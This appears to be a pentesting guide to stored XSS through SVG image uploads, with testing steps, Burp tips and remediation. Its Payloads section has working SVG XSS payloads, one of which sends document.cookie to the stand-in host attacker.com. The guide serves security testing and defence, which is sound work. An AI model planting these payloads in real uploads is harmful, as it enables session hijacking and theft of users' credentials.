# SVG XSS via Upload

## Overview
SVG (Scalable Vector Graphics) files are XML-based and can contain embedded JavaScript. When a web application allows SVG file uploads and serves them with `Content-Type: image/svg+xml` (or without a Content-Type forcing download), browsers render the SVG and execute any embedded JavaScript in the context of the hosting domain. This allows stored XSS through what appears to be an image upload.

## How It Works
- SVG is XML and supports `<script>` tags, `onload` event handlers, and JavaScript URI handlers natively.
- An SVG uploaded as an "image" that is served inline (not as an attachment) is rendered by the browser as an active document.
- If served from the same origin as the application, it has full access to cookies, localStorage, and the DOM of the parent page.
- Even if served from a subdomain or CDN, it may still be exploitable depending on CORS and cookie scope.

## Impact
- Stored XSS from what appears to be a benign image upload.
- Session hijacking via `document.cookie` access.
- Credential harvesting, keylogging.
- Actions performed on behalf of the victim in the application context.
- Particularly dangerous when admin users view uploaded images (e.g., profile pictures, attachments).

## Where to Look
- Profile picture / avatar upload.
- Document or image upload features (support tickets, submissions, galleries).
- Any endpoint that accepts "images" and doesn't strictly validate the content as a raster image.
- File sharing features where SVGs can be uploaded and shared via direct link.

## Testing Steps
1. Find a file upload feature that accepts image files.
2. Create an SVG file with embedded JavaScript (see payloads).
3. Upload the SVG with `Content-Type: image/svg+xml`.
4. Access the uploaded file's direct URL — observe if the JS executes.
5. Also test: embed the SVG in an `<img>` tag and observe if script runs (script in `<img>` doesn't execute, but with `<object>` or direct URL it does).
6. Check `Content-Type` in the server's response — if it's `image/svg+xml`, XSS is likely exploitable.
7. If served as `Content-Disposition: attachment`, XSS via direct URL won't execute.
8. Test if the SVG URL can be embedded in the app (profile picture displayed as `<img>` — safe; but display in `<object>` or iframe is dangerous).

## Payloads / Techniques
```xml
<!-- Basic SVG XSS - onload event -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle cx="50" cy="50" r="50"/>
</svg>
```

```xml
<!-- SVG with embedded script tag -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert(document.cookie);
  </script>
  <circle cx="50" cy="50" r="50" fill="red"/>
</svg>
```

```xml
<!-- SVG with cookie exfiltration -->
<svg xmlns="http://www.w3.org/2000/svg" onload="
  new Image().src='https://attacker.com/?c='+encodeURIComponent(document.cookie)
">
  <text>Image</text>
</svg>
```

```xml
<!-- Trigger via animate element -->
<svg xmlns="http://www.w3.org/2000/svg">
  <animate attributeName="x" from="0" to="1"
    onbegin="alert(1)" dur="1s"/>
</svg>
```

```xml
<!-- SVG with foreign object (HTML embedding) -->
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <foreignObject width="100" height="50">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <img src=x onerror="alert(1)"/>
    </body>
  </foreignObject>
</svg>
```

## Burp Suite Tips
- In **Repeater**, upload the SVG payload and observe the `Content-Type` of the server's response to the uploaded file's URL.
- Check if the file URL is accessible directly without authentication (stored XSS via shared links).
- **Active Scanner** may not detect this — manual verification by opening the file URL in a browser is necessary.

## Tools
- Manual browser testing (Firefox/Chrome Developer Tools)
- Burp Suite Repeater for observing Content-Type responses

## Remediation
- Serve all uploaded files with `Content-Disposition: attachment` to prevent browser rendering.
- Validate that uploaded "images" are actual raster images using a library (Pillow in Python, ImageMagick): re-encode the image through a trusted library.
- Never serve SVG files with `Content-Type: image/svg+xml` from the application origin.
- Store uploads on a separate domain (e.g., `uploads.cdn-domain.com`) with strict CORS and CSP.
- Strip SVG files of all script content using a sanitization library (DOMPurify can sanitize SVG).
- Implement a strict CSP on the upload-serving endpoint.

## References
https://portswigger.net/web-security/file-upload
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
